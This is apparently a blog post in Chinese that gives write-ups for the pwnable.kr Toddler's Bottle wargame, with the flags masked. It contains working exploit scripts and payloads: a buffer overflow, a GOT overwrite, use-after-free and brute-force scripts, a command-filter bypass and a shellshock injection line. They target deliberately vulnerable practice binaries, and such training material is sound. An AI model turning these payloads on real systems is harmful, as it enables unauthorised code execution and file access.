### Pwnable-Kr-Toddler's-Bottle

> 这里整理一下自己在pwnable.kr的Toddler's-Bottle专题的wp
>
> 只放思路，不放flag:-)



### fd

> Description：Mommy! what is a file descriptor in Linux?
>
> On Jul 30th,2018

首先连上ssh，ls看到有三个文件：fd,fd.c,flag

```shell
fd@ubuntu:~$ ls
fd  fd.c  flag
```

尝试`cat flag`

```shell
fd@ubuntu:~$ cat flag
cat: flag: Permission denied
```

然后看一下源码`cat fd.c`

![](http://wx1.sinaimg.cn/mw690/0060lm7Tly1ftrrpeai1bj30d30b4abn.jpg)

了解了`file descriptor`之后会知道

>read(int fd, void * buf, size_t count);
>
>fd = 0：stdin模式，即从标准输入流中读取数据
>
>fd = 1：stdout模式，即从标准输出流中读取数据
>
>fd = 2：stderr模式，即从标准错误输出流中读取数据

而源码中`fd = atoi(argv[1])-0x1234`，并且buf是通过read读取的，那么需要使`fd = 0`。

```shell
fd@ubuntu:~$ ./fd 4660
LETMEWIN
good job :)
***************************************
```

成功拿到flag



### col

> Description：Daddy told me about cool MD5 hash collision today.
> I wanna do something like that too!
>
> On Jul 30th,2018

ls有三个文件col,col.c,flag

col.c内容如下

```c
#include <stdio.h>
#include <string.h>
unsigned long hashcode = 0x21DD09EC;
unsigned long check_password(const char* p){
	int* ip = (int*)p;
	int i;
	int res=0;
	for(i=0; i<5; i++){
		res += ip[i];
	}
	return res;
}

int main(int argc, char* argv[]){
	if(argc<2){
		printf("usage : %s [passcode]\n", argv[0]);
		return 0;
	}
	if(strlen(argv[1]) != 20){
		printf("passcode length should be 20 bytes\n");
		return 0;
	}

	if(hashcode == check_password( argv[1] )){
		system("/bin/cat flag");
		return 0;
	}
	else
		printf("wrong passcode.\n");
	return 0;
}

```

可以知道需要输入长度为20的字符串，等分成5份后相加与`0x21DD09EC`比较

需要注意的是大端序和小端序的问题，我们输入的是大端序，而在check_password的时候是小端序相加

> 举个例子：
>
> 我们输入12345678
>
> 在check时等分成两段：1234,5678
>
> 转换成int时变成：'4321','8765'

还有一个坑：`\x09`是制表符，和`\x00`一样会被截断，本地测试如下

```shell
$ ./col `python -c "print '\x01\x09'"`
1 passcode length should be 20 bytes

$ ./col `python -c "print '\x01\x00'"`
1 passcode length should be 20 bytes

$ ./col `python -c "print '\x01\x05'"`
2 passcode length should be 20 bytes
```

构造如下

```
>>> hex(0x21DD09EC-2020305*4)
'0x19d4fdd8'
```

拿到flag

```shell
col@ubuntu:~$ ./col `python -c "print '\x05\x03\x02\x02' * 4 + '\xd8\xfd\xd4\x19'"`
++++++++++++++++++++++++++++++++++++++++
```



### bof

> Description：Nana told me that buffer overflow is one of the most common software vulnerability. 
> Is that true?
>
> On Jul 30th,2018

简单栈溢出，通过gets函数不检查长度的特性将a1覆盖为0xCAFEBABE

exp如下

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'L1B0'

from pwn import *
context.log_level = 'debug'

io = process('./bof')
#io = remote('pwnable.kr', 9000)

payload = 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1'#len = 0x2C+0x8
payload += p32(0xCAFEBABE)

io.sendlineafter(': \n',payload)

io.interactive()
```

那个9000好像挂了，连不上去。只能本地get_shell

![](http://wx1.sinaimg.cn/mw690/0060lm7Tly1ftrwvuqcaij30md08mtaa.jpg)



### flag

>Description：Papa brought me a packed present! let's open it.
>
>Download : http://pwnable.kr/bin/flag
>
>This is reversing task. all you need is binary
>
>On Jul 30th,2018

根据题目提示这是个加壳的elf，那么首先用`upx -d`试了一发

![](http://wx2.sinaimg.cn/mw690/0060lm7Tly1ftry9kazjsj30jw056aag.jpg)

~~结果发现成功了？？？这运气也太好了吧~~

后来发现`strins flag`能看到UPX字样

接着IDA看一波，点进去flag，就能发现flag:-)

```
aUpxSoundsLikeA db **********************************,0
```



### random

> Description：Daddy, teach me how to use random value in programming!
>
> On Jul 30th,2018

源码

```c
#include <stdio.h>

int main(){
	unsigned int random;
	random = rand();	// random value!

	unsigned int key=0;
	scanf("%d", &key);

	if( (key ^ random) == 0xdeadbeef ){
		printf("Good!\n");
		system("/bin/cat flag");
		return 0;
	}

	printf("Wrong, maybe you should try 2^32 cases.\n");
	return 0;
}
```

这道题其实是个伪随机，将源码拿到本地跑一下，将random输出，结果如下

![](http://wx2.sinaimg.cn/mw690/0060lm7Tly1ftrvmcv9nzj30c4094dgo.jpg)

可以看到在本地`random`一直都是`1804289383`

并且可以看到远程和本地的libc版本相同，基本就稳了

```shell
#远程
random@ubuntu:~$ ldd 1
ldd: ./1: No such file or directory
random@ubuntu:~$ ldd random
	linux-vdso.so.1 =>  (0007fff7cd94000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0007f94bbaf1000)
	/lib64/ld-linux-x86-64.so.2 (00055fc8120b000)
#本地
#  @ -PC in  [14:29:03] C:1	
$ ldd random
	linux-vdso.so.1 (0007fff7a1e8000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0007ff309609000)
	/lib64/ld-linux-x86-64.so.2 (00055abd4396000)
	
```

`0xdeadbeef^1804289383`拿到flag:-)

```shell
random@ubuntu:~$ ./random 
3039230856
Good!
**********************************
```



### cmd1

> Description：Mommy! what is PATH environment in Linux?
>
> On Jul 30,2018

这题类似沙盒逃逸，不过简单很多，题目将带有`flag sh tmp`子串的命令禁用，并且修改了环境变量.

修改环境变量的结果是`cat`需要`/bin/cat`才能执行

注：cat的所在位置可以通过`whereis`命令找到

#### 方法一：

不能有`flag`我们可以使用通配符来达到目的

比如说`./cmd1 "/bin/cat f*"`或是`./cmd1 "/bin/cat fla?"`都可以

#### 方法二：

分割字符串

`./cmd1 '/bin/cat ”f“ag' `



### passcode

>Description：Mommy told me to make a passcode based login system.
>My initial C code was compiled without any error!
>Well, there was some compiler warning, but who cares about that?
>
>On Jul 30,2018

首先`file passcode`，是32位的elf，于是先从pwnable\.kr上把它copy下来，便于本地分析

```shell
scp -P 2222 passcode@143.248.249.64:/home/passcode/passcode /home/****/Desktop
```

看源码会发现`passcode1`和`passcode2`的赋值没加`&`，所以我们的**输入**会当做**地址**将其**原有的地址覆盖**，但由于题目check的`passcode1 = 338150 `和`passcode2 = 13371337`这两个地址**不可写**，在所以在运行时会报错。

并且`checksec passcode`可以看到

```shell
$ checksec passcode
[*] 
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found #开启栈保护
    NX:       NX enabled #堆栈不可执行，即不能用shellcode的栈溢出方式getshell
    PIE:      No PIE (0x8048000) #基址不随机     
```

所以直接想符合这个条件是不可能了。

这里用到了一个叫`GOT表覆写`的操作，GOT表是一个函数指针数组，里面的函数地址可写，故我们可以通过改变函数的地址来改变程序流程。

用IDA可以看到`welcome`函数的`name`数组长度有100，由于`welcome`函数和l`login`函数是连续执行，中间没有压栈等操作，故ebp是相同的。而name的地址为`ebp-0x70`，passcode1的地址是`ebp-0x10`，相差0x60即96，所以正好还有四个字节可以供我们将got表的`printf`函数地址传进passcode1，然后把`system('/bin/cat flag')`的地址传进passcode2，达到修改got表里`printf`函数地址的目的，下次执行`printf`函数时即`cat flag`。

> 一个trick：IDA里`crtl+s`可以查看各个段的地址

#### 第一种方法：运行exp脚本

在passcode文件夹里没有权限，我们可以退到tmp文件夹里编写脚本(不知道为什么提示没有权限写...)

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'L1B0'

from pwn import *

io = process('./passcode')

payload = 'a'*0x60
payload += p32(804A000) + '\n'
#0x80485E3 = 134514147
payload += '134514147\n'

io.sendline(payload)
io.interactive()
```

#### 第二种方法：python -c

```shell
python -c "print 'a'*0x60+'\x00\xa0\x04\x08\n'+'134514147\n'" | ./passcode
```



### input

> Mom? how can I pass my input to a computer program?
>
> On Jul 31,2018

这题考察的都是我不会的。。。我真菜

#### level1

```c
	// argv
	if(argc != 100) return 0;
	if(strcmp(argv['A'],"\x00")) return 0;
	if(strcmp(argv['B'],"\x20\x0a\x0d")) return 0;
	printf("Stage 1 clear!\n");	
```

简单说一下`argc`和`argv`的含义

argc：外部命令参数的个数

argv：存储外部命令参数的数组，其中argv[0]为可执行文件名

比如说我们执行`./hello 1 2 3`，这时`argc = 4`，`argv = ['./hello','1','2','3']`

清楚了这两个的含义之后就能够很清楚的分析上面的代码

首先`argc == 100`即命令参数个数为99，并且`argv['A'] = argv[65] = "\x00"` `argv['B'] = argv[66] =  "\x20\x0a\x0d" `即可通过第一关

我用`pwntools`实现的这个目的

```python
from pwn import *
context.log_level = 'debug'
#level1	
argv = [ "a" for i in range(100) ]
argv[0] = "./input11"
argv[ord('A')] = "\x00"
#print libc.strcmp(sys.argv[ord('A')],"\x00")
argv[ord('B')] = "\x20\x0a\x0d"
io = process(argv = argv)
io.recv()
```

#### level2

```c
	// stdio
	char buf[4];
	read(0, buf, 4);
	if(memcmp(buf, "\x00\x0a\x00\xff", 4)) return 0;
	read(2, buf, 4);
        if(memcmp(buf, "\x00\x0a\x02\xff", 4)) return 0;
	printf("Stage 2 clear!\n");
```

这里需要了解的是read的三种模式，在`0 fd`题目中有提到，不再赘述

第一个条件：在`stdin`模式中读取4个字节的数据赋值给buf并且buf = “\x00\x0a\x00\xff”

第二个条件：在`stderr`模式中读取4个字节的数据赋值给buf并且buf = “\x00\x0a\x02\xff”

由于python大法好，这个条件可以轻松实现

```python
#level2
stdinr,stdinw = os.pipe()# 建立stdin的读和写之间的管道
stderrr,stderrw = os.pipe()# 同理
os.write(stdinw,"\x00\x0a\x00\xff")# 向stdin的写入数据
os.write(stderrw,"\x00\x0a\x02\xff")# 同理
io = process( argv = argv, stdin = stdinr, stderr = stderrr )
```

#### level3

```c
	// env
	if(strcmp("\xca\xfe\xba\xbe", getenv("\xde\xad\xbe\xef"))) return 0;
	printf("Stage 3 clear!\n");
```

通过百度了解到`getenv`是获取环境变量的内容的函数

>char * getenv(const char *name);
>
>getenv()用来取得参数name环境变量的内容。参数name为环境变量的名称，如果该变量存在则会返回指向该内容的指针。环境变量的格式为name＝value。

这个部分用`pwntools`也可以很容易的实现

```python
dic = {"\xde\xad\xbe\xef":"\xca\xfe\xba\xbe"}
io = process( argv = argv, env = dic, stdin = stdinr, stderr = stderrr )
```

#### level4

```c
	// file
	FILE* fp = fopen("\x0a", "r");
	if(!fp) return 0;
	if( fread(buf, 4, 1, fp)!=1 ) return 0;
	if( memcmp(buf, "\x00\x00\x00\x00", 4) ) return 0;
	fclose(fp);
	printf("Stage 4 clear!\n");	
```

这里简单说明一下`fread`函数的功能

> int fread(void *ptr, int size, int nitems, FILE *stream);
>
> ptr指针存储读取到的数据，size表示单个元素的大小，nitems表示元素的个数，stream表示提供数据的文件指针，fread函数返回的是成功读取元素的个数

那么level4中的条件就是需要从文件`\x0a`中读取一个元素，这个元素必须是`\x00\x00\x00\x00`

这个条件也挺容易实现，我们只需要生成一个名为`\x0a`的文件，且内容为`\x00\x00\x00\x00`即可

```c
#level4 
with open("\x0a",'w') as x:
	x.write("\x00\x00\x00\x00")
	x.close()
```

#### level5

```c
	// network
	int sd, cd;
	struct sockaddr_in saddr, caddr;
	sd = socket(AF_INET, SOCK_STREAM, 0);
	if(sd == -1){
		printf("socket error, tell admin\n");
		return 0;
	}
	saddr.sin_family = AF_INET;
	saddr.sin_addr.s_addr = INADDR_ANY;
	saddr.sin_port = htons( atoi(argv['C']) );
	if(bind(sd, (struct sockaddr*)&saddr, sizeof(saddr)) < 0){
		printf("bind error, use another port\n");
    		return 1;
	}
	listen(sd, 1);
	int c = sizeof(struct sockaddr_in);
	cd = accept(sd, (struct sockaddr *)&caddr, (socklen_t*)&c);
	if(cd < 0){
		printf("accept error, tell admin\n");
		return 0;
	}
	if( recv(cd, buf, 4, 0) != 4 ) return 0;
	if(memcmp(buf, "\xde\xad\xbe\xef", 4)) return 0;
	printf("Stage 5 clear!\n");
```

这一大堆socket代码都是啥啥啥，对c的socket了解很少，看的贼费劲

大致条件是通信的端口(port)是argv['C']的值，而INADDR_ANY会自动填入本机ip地址

那么我们建立好通信之后在发送`\xde\xad\xbe\xef`即可

#### 小trick

在tmp文件夹里我们可以运行自己的脚本

- 从本地复制文件到远程

```shell
scp -P 2222 filename input2@pwnable.kr:/tmp/
```

- 软链接flag

```shell
ln /home/input2/flag flag
```

然而不知道为啥都clear了cat不到flag，发现tmp文件夹里有个**flag文件夹**在搅屎。。。

于是自己在里面建了个文件夹，再链接一下flag即可

#### 完整exp

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'L1B0'

from pwn import *
import os
from socket import *
context.log_level = 'debug'

#libc = CDLL('/lib/x86_64-linux-gnu/libc.so.6') 
argv = []
dic = []

#log_level2 
stdinr,stdinw = os.pipe()
stderrr,stderrw = os.pipe()
os.write(stdinw,"\x00\x0a\x00\xff")
os.write(stderrw,"\x00\x0a\x02\xff")
	
#level1	
argv = [ "a" for i in range(100) ]
#argv[0] = "./input"
argv[0] = "/home/input2/input"
argv[ord('A')] = "\x00"
#print libc.strcmp(sys.argv[ord('A')],"\x00")
argv[ord('B')] = "\x20\x0a\x0d"
argv[ord('C')] = "8888"

#level3
dic = {"\xde\xad\xbe\xef":"\xca\xfe\xba\xbe"}


#level4 
with open("\x0a",'w') as x:
	x.write("\x00\x00\x00\x00")
	x.close()

if __name__ ==  "__main__":
	
	sd = socket(AF_INET, SOCK_STREAM)

	io = process( argv = argv,  env = dic, stdin = stdinr, stderr = stderrr )
	 
	#level5
	
	host = "pwnable.kr"
	port = int(argv[ord('C')])

	sd.connect((host,port))
	sd.send("\xde\xad\xbe\xef")
	sd.close()

	io.interactive()
	io.close()
```

<br>

### uaf

> Description：Mommy, what is Use After Free bug?
>
> On Aug 1,2018

`Use After Free`

#### exp

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'L1B0'

from pwn import *
context.log_level = 'debug'

#elf = ELF('./uaf')

len = '16'
sys_addr = p64(0401568)

f = open('addr.txt','w')
f.write(sys_addr)
f.close()

io = process( argv = ['/home/uaf//uaf',len,'addr.txt'] )

io.sendlineafter("free\n",'3')
io.sendlineafter("free\n",'2')
io.sendlineafter("free\n",'2')
io.sendlineafter("free\n",'1')

io.interactive()
```

先把脚本放到`/tmp`文件夹里，然后`cat /home/uaf/flag`即可

<br>

### mistake

>Description：We all make mistakes, let's move on.
>(don't take this too seriously, no fancy hacking skill is required at all)
>
>This task is based on real event
>Thanks to dhmonkey
>
>hint : operator priority
>
>On Aug 1,2018

题目提示是运算符的优先级

源码如下

```c
#include <stdio.h>
#include <fcntl.h>

#define PW_LEN 10
#define XORKEY 1

void xor(char* s, int len){
	int i;
	for(i=0; i<len; i++){
		s[i] ^= XORKEY;
	}
}

int main(int argc, char* argv[]){
	
	int fd;
	if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0)){
		printf("can't open password %d\n", fd);
		return 0;
	}

	printf("do not bruteforce...\n");
	sleep(time(0)%20);

	char pw_buf[PW_LEN+1];
	int len;
	if(!( len = read(fd,pw_buf,PW_LEN) > 0 )){
		printf("read error\n");
		close(fd);
		return 0;		
	}

	char pw_buf2[PW_LEN+1];
	printf("input password : ");
	scanf("%10s", pw_buf2);

	// xor your input
	xor(pw_buf2, 10);

	if(!strncmp(pw_buf, pw_buf2, PW_LEN)){
		printf("Password OK\n");
		system("/bin/cat flag\n");
	}
	else{
		printf("Wrong Password\n");
	}

	close(fd);
	return 0;
}
```

能在优先级上出现问题的就是有两个或三个运算符出现在一句代码中，并且没有括号表明优先级的次序。

看一遍源码会发现有两行代码有点奇怪

```c
fd=open("/home/mistake/password",O_RDONLY,0400) < 0
len = read(fd,pw_buf,PW_LEN) > 0
```

[linux下open函数的用法](https://www.cnblogs.com/ace-wu/p/6640186.html)，这里不再赘述

首先我们知道优先级从大到小依次是：'>'，'<'，'='

那么第一句代码的执行顺序就是`fd = ( open("/home/mistake/password",O_RDONLY,0400) < 0 )`

先以只读方式打开password文件，并且0400代表该文件的所有者具有读取的权限，open函数返回的值在欲检查的权限都通过核查的情况下返回0，否则返回-1。我们假设文件成功打开，那么返回0，先和小于0比较，表达式值为0，再赋给fd。所以这里的fd在代码执行完毕后并不是我们所想的返回一个password的文件流，而是等于0。

第二句代码的执行顺序和第一句类似，这里read函数中`fd=0`意味着是从`stdin`即标准输入流中读取数据，所以实际上`pw_buf`的内容不是`password`，而是我们用户的输入作为`pw_buf`，这也是为什么可执行文件mistake在运行时不直接出现`input password`字样的原因。

那么就相当于`password`掌握在自己手上，只需通过`xor`校验即可

```shell
mistake@ubuntu:~$ ./mistake 
do not bruteforce...
1111111111
input password : 0000000000
Password OK
**********************************************
```

<br>

### shellshock

>Description：Mommy, there was a shocking news about bash.
>I bet you already know, but lets just make it sure :)
>
>On Aug 1,2018

原理

> shellshock是一个14年爆出的漏洞，导致漏洞出问题的是以”(){”开头定义的环境变量在命令ENV中解析成函数后，Bash执行未退出，而是继续解析并执行shell命令，而其核心的原因在于在输入的过滤中没有严格限制边界，也没有做出合法化的参数判断。--[Linux公社](https://www.linuxidc.com/Linux/2014-10/107925.htm)

测试一下发现给的bash确实有shellshock漏洞

```shell
shellshock@ubuntu:~$ env x='() { :;}; echo vulnerable' ./bash -c 'echo hello'
vulnerable
hello
```

目录下还有shellshock的源码

```c
#include <stdio.h>
int main(){
	setresuid(getegid(), getegid(), getegid());
	setresgid(getegid(), getegid(), getegid());
	system("/home/shellshock/bash -c 'echo shock_me'");
	return 0;
}
```

看一下文件的权限

```shell
shellshock@ubuntu:~$ ls -l
total 960
-r-xr-xr-x 1 root shellshock     959120 Oct 12  2014 bash
-r--r----- 1 root shellshock_pwn     47 Oct 12  2014 flag
-r-xr-sr-x 1 root shellshock_pwn   8547 Oct 12  2014 shellshock
-r--r--r-- 1 root root              188 Oct 12  2014 shellshock.c
```

可以看到flag和shellshock都属于shellshock_pwn这个组，如果我们获得了shellshock_pwn的root权限，那么就可以读取flag的内容

分析一下shellshock.c的代码，getegid函数能获取当前有效组的识别码，这里获取的就是shellshock_pwn组，而setresuid和setresgid是分别将组标识号和用户标识号都设置为shellshock_pwn组的识别号。那么运行shellshock之后我们就有了读取flag的权限。

payload：`env x='() { :;}; ./bash -c "cat flag"' ./shellshock`

<br>

### lotto

>Description：Mommy! I made a lotto program for my homework.
>do you want to play?
>
>On Aug 1,2018

这就是个猜号码的程序，但是代码有bug

关键如下

```c
  for ( i = 0; i <= 5; ++i )
    buf[i] = (unsigned __int8)buf[i] % 45u + 1; 

  for ( j = 0; j <= 5; ++j )
  {
    for ( k = 0; k <= 5; ++k )
    {
      if ( buf[j] == submit[k] )
        ++v3;
    }
  }
  if ( v3 == 6 )
    system("/bin/cat flag");
```

`buf`是程序生成的数组，长度为6，但是被模了45，范围缩小很多

`submit`是我们的输入，长度也为6

其实要达到`v3 == 6`很简单，原因是**双重循环** 。我们只需输入一个长度为6，每个字符都一样的字符串，然后爆破即可。因为只要碰到和`submit`数组里一个元素相等，那么`v3 == 6`就稳了。

exp如下

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'L1B0'

from pwn import *
context.log_level = 'debug'

io = process('./lotto')

for i in range(46):

	my_byte = chr(i)*6
	io.sendline('1')
	io.sendlineafter(": ",my_byte)
	a = io.recvline()
	if a != "Lotto Start!\n":
		break
        
io.interactive()
```





